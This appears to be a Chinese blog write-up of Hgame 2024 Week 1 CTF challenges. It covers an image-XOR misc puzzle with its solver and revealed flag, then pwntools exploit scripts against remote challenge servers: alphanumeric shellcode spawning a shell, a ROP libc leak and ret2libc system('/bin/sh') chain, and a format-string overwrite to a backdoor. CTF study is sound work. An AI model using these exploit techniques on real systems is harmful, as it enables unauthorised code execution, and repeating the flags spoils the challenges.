+<h2 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)</span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)</span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i])</span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>相当于把flag一个个写在图片中，然后和一个key进行异或</p>
+<p>取任意一张图片（不考虑第一张和最后一张）和其他图片异或，一定会出现<strong>两张图片仅有一个字符</strong></p>
+<p>这两个字符一定分别是前一个字符和后一个字符</p>
+<p>所以，排列异或之后慢慢看就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_black_pixels</span>(<span class="params">image1</span>):</span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> pixels1[x, y]==(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line">files=os.listdir(<span class="string">&#x27;png_out&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> files:</span><br><span class="line">    a=Image.<span class="built_in">open</span>(<span class="string">f&#x27;png_out/<span class="subst">&#123;j&#125;</span>&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    images_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ind,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(files):</span><br><span class="line">        b=Image.<span class="built_in">open</span>(<span class="string">f&#x27;png_out/<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        c=xor_images(a,b)</span><br><span class="line">        black_pixels_num=count_black_pixels(c)</span><br><span class="line">        images_dict[ind]=&#123;<span class="string">&#x27;image&#x27;</span>:copy.copy(c),<span class="string">&#x27;black_pixels_num&#x27;</span>:black_pixels_num,<span class="string">&#x27;filename&#x27;</span>:i&#125;</span><br><span class="line">    os.mkdir(j)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> images_dict.values():</span><br><span class="line">        image=i[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">        image.save(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>/xor_<span class="subst">&#123;i[<span class="string">&#x27;filename&#x27;</span>]&#125;</span>.png&quot;</span>)</span><br><span class="line">        <span class="comment">#print(content)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#hgame&#123;1adf_17eb_803c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2015.45.57_O7k7vLgdRx.png"></p>
+<p>myread限制了shellcode必须为字母数字</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://www.cnblogs.com/hetianlab/p/17647861.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://www.cnblogs.com/hetianlab/p/17647861.html" autofill="title,icon"><div class="left"><span class="title">https://www.cnblogs.com/hetianlab/p/17647861.html</span><span class="cap link footnote">https://www.cnblogs.com/hetianlab/p/17647861.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p>amd64的</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/veritas501/ae64" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://github.com/veritas501/ae64" autofill="title,icon"><div class="left"><span class="title">https://github.com/veritas501/ae64</span><span class="cap link footnote">https://github.com/veritas501/ae64</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p>报错解决</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/keystone-engine/keystone/issues/386" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://github.com/keystone-engine/keystone/issues/386" autofill="title,icon"><div class="left"><span class="title">https://github.com/keystone-engine/keystone/issues/386</span><span class="cap link footnote">https://github.com/keystone-engine/keystone/issues/386</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p>x64的</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/rcx/shellcode_encoder" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://github.com/rcx/shellcode_encoder" autofill="title,icon"><div class="left"><span class="title">https://github.com/rcx/shellcode_encoder</span><span class="cap link footnote">https://github.com/rcx/shellcode_encoder</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">p=remote(<span class="string">&#x27;47.100.137.175&#x27;</span>,<span class="number">30959</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">obj=AE64()</span><br><span class="line">shellcode=obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;input the length of your shellcode:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;input your shellcode:&#x27;</span>,shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>pwn随机数模版题目+libc泄漏基址</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2017.26.09_bKW36FAONI.png"></p>
+<p>猜对了会给一个栈溢出的点</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/" autofill="title,icon"><div class="left"><span class="title">https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/</span><span class="cap link footnote">https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><strong>ctypes包的cdll.LoadLibrary(‘</strong><div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="http://libc.so.xxx" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=http://libc.so.xxx" autofill="title,icon"><div class="left"><span class="title">http://libc.so.xxx</span><span class="cap link footnote">http://libc.so.xxx</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div><strong>’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>,<span class="number">31178</span>)</span><br><span class="line">libc.srand(c_uint(libc.time(<span class="number">0</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;</span>,<span class="string">b&#x27;jok&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    r=libc.rand()%<span class="number">100</span>+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please guess the number:&#x27;</span>,p64(r))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2023.28.22_58k_N2Uq9c.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>,<span class="number">31058</span>)</span><br><span class="line">libc.srand(c_uint(libc.time(<span class="number">0</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;</span>,<span class="string">b&#x27;jok&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    r=libc.rand()%<span class="number">100</span>+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please guess the number:&#x27;</span>,p64(r))</span><br><span class="line">pop_rdi_addr=<span class="number">0x401423</span></span><br><span class="line">puts_got_addr=<span class="number">0x404018</span></span><br><span class="line">puts_plt_addr=<span class="number">0x4010b0</span></span><br><span class="line">myread_addr=<span class="number">0x40125d</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">puts_offset=<span class="number">0x084420</span></span><br><span class="line">sys_offset=<span class="number">0x052290</span></span><br><span class="line">sh_offset=<span class="number">0x1b45bd</span></span><br><span class="line"><span class="comment">#泄漏</span></span><br><span class="line">payload= <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>+p64(ret_addr)+ p64(pop_rdi_addr)+p64(puts_got_addr)  + p64(puts_plt_addr) + p64(myread_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;reward to thy brilliant mind&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base_addr=u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-puts_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(sh_offset+libc_base_addr)+p64(sys_offset+libc_base_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt string"></a>ezfmt string</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2010.12.10_Mwyv9TV6DV.png"></p>
+<p>限制了格式化字符串的输入</p>
+<p>而且给了后门了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2010.21.14_gvfqXkX6Kh.png"></p>
+<p>%d 有符号32位整数</p>
+<p>%u 无符号32位整数 &#x20;</p>
+<p>%lld 有符号64位整数</p>
+<p>%llx有符号64位16进制整数</p>
+<p>只有一次的格式化字符串的机会</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://www.codercto.com/a/85297.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://www.codercto.com/a/85297.html" autofill="title,icon"><div class="left"><span class="title">https://www.codercto.com/a/85297.html</span><span class="cap link footnote">https://www.codercto.com/a/85297.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p>提到了一种使用格式化字符串漏洞使程序无限循环的操作</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.11.33_PyhOKuBzQf.png"></p>
+<p>程序退出会调用finiarray</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.13.47_qeqY9cGbjy.png"></p>
+<p>查看<code>_fini_array</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.14.30_Hq-4oevtL3.png"></p>
+<p>直接覆盖为后门函数就行</p>
+<p>但是这题似乎不行</p>
+<p>直接抽奖然后栈迁移，控制<code>rbp</code>上来</p>
+<p>概率还可以，<code>1/16</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">backdoor_addr=<span class="number">0x40123d</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;47.102.130.35&#x27;</span>, <span class="number">31292</span>)</span><br><span class="line">    payload=<span class="string">f&#x27;%<span class="subst">&#123;<span class="number">0x08</span>&#125;</span>c%18$hhnAAAAAA&#x27;</span>.encode()+p64(backdoor_addr)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;make strings and getshell&#x27;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Elden-Ring-Ⅰ"><a href="#Elden-Ring-Ⅰ" class="headerlink" title="Elden Ring Ⅰ"></a>Elden Ring Ⅰ</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.04.51_eD7cjXP85Y.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.05.18_5trFNp14Rb.png"></p>
